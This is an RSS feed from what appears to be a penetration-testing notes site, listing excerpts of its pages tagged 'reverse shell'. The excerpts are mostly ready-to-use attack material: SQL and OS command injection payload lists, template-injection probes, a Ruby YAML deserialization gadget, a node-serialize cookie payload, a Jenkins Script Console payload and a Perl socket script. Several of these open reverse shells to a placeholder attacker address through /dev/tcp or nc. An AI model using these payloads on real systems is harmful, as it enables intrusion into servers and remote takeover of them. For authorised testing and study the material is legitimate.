<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Reverse Shell on D0CUM3NTN4T10N</title>
    <link>https://documentnation.github.io/tags/reverse-shell/</link>
    <description>Recent content in Reverse Shell on D0CUM3NTN4T10N</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en</language>
    <lastBuildDate>Thu, 14 Dec 2023 00:00:00 +0000</lastBuildDate>
    <atom:link href="https://documentnation.github.io/tags/reverse-shell/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>SQL Injection Cheat Sheet</title>
      <link>https://documentnation.github.io/docs/hdks/web/security-risk/sql-injection-cheat-sheet/</link>
      <pubDate>Thu, 14 Dec 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/security-risk/sql-injection-cheat-sheet/</guid>
      <description>Comment Syntax linkComment syntax is depending on the database used in the website.&#xA;MSDB Comments MySQL -- - (add a space after --) # /*comment*/ /*!comment*/ MSSQL -- /*comment*/ Oracle -- PostgreSQL -- /*comment*/ SQLite -- /*comment*/ Basic Injection linkFirst off, check if we can inject SQL commands into forms or URL params in the target website.&#xA;&amp;#39; OR 1=1-- &amp;#39; OR 1=1-- - &amp;#39; OR 1=1# &amp;#39; OR &amp;#39;1&amp;#39;=&amp;#39;1&amp;#39;-- &amp;#39; OR &amp;#39;1&amp;#39;=&amp;#39;1&amp;#39;-- - &amp;#39; OR &amp;#39;1&amp;#39;=&amp;#39;1&amp;#39;# &amp;#39; OR &amp;#39;1&amp;#39;=&amp;#39;1-- &amp;#39; OR &amp;#39;1&amp;#39;=&amp;#39;1-- - &amp;#39; OR &amp;#39;1&amp;#39;=&amp;#39;1# &amp;#34; OR 1=1-- &amp;#34; OR 1=1-- - &amp;#34; OR 1=1# &amp;#39;) OR 1=1-- &amp;#39;) OR 1=1-- - &amp;#39;) OR 1=1# &amp;#39;; OR 1=1-- &amp;#39;; OR 1=1-- - &amp;#39;; OR 1=1# admin or 1=1-- admin or 1=1-- - admin or 1=1# WAF Bypass linkReference: https://owasp.</description>
    </item>
    <item>
      <title>OS Command Injection</title>
      <link>https://documentnation.github.io/docs/hdks/web/security-risk/os-command-injection/</link>
      <pubDate>Sat, 11 Nov 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/security-risk/os-command-injection/</guid>
      <description>Basic Payloads linkIf the payload includes whitespaces (&amp;rsquo; &amp;lsquo;), we need to change it to &amp;rsquo;+&amp;rsquo; or URL encoding (&amp;rsquo;%20&amp;rsquo;).&#xA;/api/cmd/whoami /command/whoami /?cmd=whoami /?cmd=;id /?cmd=ls /?cmd=ls .. /?cmd=ls ../ /?cmd=ls /home /?cmd=`ping -c 1 10.0.0.1` /?file=example.txt; echo $(ls -al /) /?file=example.txt; echo $(ls -al /) | &amp;lt;!-- PHP query string --&amp;gt; /?q=;system($_GET[cmd])&amp;amp;cmd=whoami /?q=${system($_GET[cmd])}&amp;amp;cmd=whoami /?productId=1&amp;amp;stockId=1|whoami /?productId=1&amp;amp;stockId=1|id &amp;lt;!-- Windows --&amp;gt; /?file=example.txt | systeminfo # /?file=example.txt ; systeminfo # /?file=example.txt&amp;#39;) ; systeminfo # URL Encoding linkWe may be able to bypass specific character filter by encoding them.</description>
    </item>
    <item>
      <title>SQL Injection with Sqlmap</title>
      <link>https://documentnation.github.io/docs/hdks/web/security-risk/sql-injection-with-sqlmap/</link>
      <pubDate>Fri, 22 Sep 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/security-risk/sql-injection-with-sqlmap/</guid>
      <description>Basic Usage link # GET request sqlmap -u &amp;#34;http://&amp;lt;target-ip&amp;gt;/?search=test&amp;#34; Using Burp Suite Request File linkWe can specify a request file which is downloaded from Burp Suite.&#xA;In Burp Suite, right-click on the HTTP request header screen, then click Save Item to download the request file. We can use it with SQLmap. Add the &amp;quot;-r&amp;quot; flag as below.&#xA;sqlmap -r request.txt In addition, we can see payloads to be tested in Burp Suite by setting the Burp proxy IP address to the --proxy flag.</description>
    </item>
    <item>
      <title>Spring Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/web/framework/java/spring-pentesting/</link>
      <pubDate>Fri, 15 Sep 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/framework/java/spring-pentesting/</guid>
      <description>Framework Detection linkIf we get the Whitelabel Error Page, the website may use Spring Boot.&#xA;Enumeration linkDirectory Discovery link ffuf -u https://example.com/FUZZ -w seclists/Discovery/Web-Content/spring-boot.txt SSTI linkDiscovery linkIf there is an input form, such as a search form, or URL parameter which the parameter is reflected in the website, you may be able to find the vulnerability to the server-side template injection.&#xA;Try them:&#xA;2*2 #{2*2} *{2*2} Then you can also check more about that.</description>
    </item>
    <item>
      <title>SQL Injection</title>
      <link>https://documentnation.github.io/docs/hdks/web/security-risk/sql-injection/</link>
      <pubDate>Tue, 27 Jun 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/security-risk/sql-injection/</guid>
      <description>Identify Where SQL Injection can be Performed linkThere are many places where SQLi can be performed. For example,&#xA;URL parameters POST parameters HTTP request headers (Cookie, User-Agent, etc.) Cheat Sheet linkTo see SQL injection cheat sheet, please refer to this page.</description>
    </item>
    <item>
      <title>Ruby Privilege Escalation</title>
      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/ruby-privilege-escalation/</link>
      <pubDate>Tue, 28 Mar 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/ruby-privilege-escalation/</guid>
      <description>Remote Code Execution with YAML linkCheck if the current user could run the ruby script as root privilege.&#xA;(root) NOPASSWD: /usr/bin/ruby sample.rb If the sample.rb contains the “File.read(’sample.yml’)”, modify the YAML file as follow:&#xA;--- - !ruby/object:Gem::Installer i: x - !ruby/object:Gem::SpecFetcher i: y - !ruby/object:Gem::Requirement requirements: !ruby/object:Gem::Package::TarReader io: &amp;amp;1 !ruby/object:Net::BufferedIO io: &amp;amp;1 !ruby/object:Gem::Package::TarReader::Entry read: 0 header: &amp;#34;abc&amp;#34; debug_output: &amp;amp;1 !ruby/object:Net::WriteAdapter socket: &amp;amp;1 !ruby/object:Gem::RequestSet sets: !ruby/object:Net::WriteAdapter socket: !ruby/module &amp;#39;Kernel&amp;#39; method_id: :system git_set: &amp;#34;bash -c &amp;#39;bash -i &amp;gt;&amp;amp; /dev/tcp/&amp;lt;local-ip&amp;gt;/&amp;lt;local-port&amp;gt; 0&amp;gt;&amp;amp;1&amp;#39;&amp;#34; method_id: :resolve Then start listener in local machine.</description>
    </item>
    <item>
      <title>Node.js Deserialization Attack</title>
      <link>https://documentnation.github.io/docs/hdks/web/security-risk/nodejs-deserialization-attack/</link>
      <pubDate>Mon, 02 Jan 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/security-risk/nodejs-deserialization-attack/</guid>
      <description>Cookie Reverse Shell link1. Generate a Payload linkWe can use the online tools like RunKit to execute the node package.&#xA;If you want to do in your local environment, you need to install a npm package first.&#xA;mkdir test cd test npm install node-serialize Next, create the payload for serialization to execute a reverse shell.&#xA;For instance, the file is named “serialize.js”.&#xA;let y = { rce: function() { require(&amp;#39;child_process&amp;#39;).exec(&amp;#39;rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc &amp;lt;local-ip&amp;gt; &amp;lt;local-port&amp;gt; &amp;gt;/tmp/f&amp;#39;, function(error, stdout, stderr) { console.</description>
    </item>
    <item>
      <title>Jenkins Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/web/jenkins-pentesting/</link>
      <pubDate>Sun, 01 Jan 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/jenkins-pentesting/</guid>
      <description>Brute Force Credentials link msfconsole msf &amp;gt; use auxiliary/scanner/http/jenkins_login Reverse Shell on Dashboard linkYou need to have the credential.&#xA;Opening Listener on Your Local Machine&#xA;nc -lvnp 4444 Login to Jenkins&#xA;Access &amp;ldquo;http://localhost:8080&amp;rdquo; in browser and login.&#xA;Click &amp;ldquo;Manage Jenkins&amp;rdquo; -&amp;gt; &amp;ldquo;Script Console&amp;rdquo;&#xA;Add the Payload in the Console&#xA;r = Runtime.getRuntime() p = r.exec([&amp;#34;/bin/bash&amp;#34;, &amp;#34;-c&amp;#34;, &amp;#34;exec 5&amp;lt;&amp;gt;/dev/tcp/&amp;lt;Attacker_IP&amp;gt;/4444; cat &amp;lt;&amp;amp;5 | while read line; do \$line 2&amp;gt;&amp;amp;5 &amp;gt;&amp;amp;5; done&amp;#34;] as String[]) p.</description>
    </item>
    <item>
      <title>Pug Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/web/template-engine/pug-pentesting/</link>
      <pubDate>Thu, 01 Dec 2022 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/template-engine/pug-pentesting/</guid>
      <description>Server-Side Template Injection (SSTI) link #{2*2} #{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad(&amp;#34;child_process&amp;#34;).exec(&amp;#39;id&amp;#39;)}()} Reverse Shell linkFirst off, create a payload.&#xA;use Socket;$i=&amp;#34;&amp;lt;local-ip&amp;gt;&amp;#34;;$p=&amp;lt;local-port&amp;gt;;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&amp;#34;tcp&amp;#34;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&amp;#34;&amp;gt;&amp;amp;S&amp;#34;);open(STDOUT,&amp;#34;&amp;gt;&amp;amp;S&amp;#34;);open(STDERR,&amp;#34;&amp;gt;&amp;amp;S&amp;#34;);exec(&amp;#34;/bin/sh -i&amp;#34;);}; Encode it with Base64.&#xA;And start listener for getting the incoming connection.&#xA;nc -lvnp 4444 Then prepare the full payload contained the above Base64 encoded hash.&#xA;h1= Hello world p 3*3 is #{3*3} #{spawn_sync = this.process.binding(&amp;#39;spawn_sync&amp;#39;)} #{ normalizeSpawnArguments = function(c,b,a){if(Array.isArray(b)?b=b.slice(0):(a=b,b=[]),a===undefined&amp;amp;&amp;amp;(a={}),a=Object.assign({},a),a.shell){const g=[c].concat(b).join(&amp;#39; &amp;#39;);typeof a.shell===&amp;#39;string&amp;#39;?c=a.shell:c=&amp;#39;/bin/sh&amp;#39;,b=[&amp;#39;-c&amp;#39;,g];}typeof a.argv0===&amp;#39;string&amp;#39;?b.unshift(a.argv0):b.unshift(c);var d=a.env||process.env;var e=[];for(var f in d)e.push(f&amp;#43;&amp;#39;=&amp;#39;&amp;#43;d[f]);return{file:c,args:b,options:a,envPairs:e};}} #{spawnSync = function(){var d=normalizeSpawnArguments.apply(null,arguments);var a=d.</description>
    </item>
  </channel>
</rss>
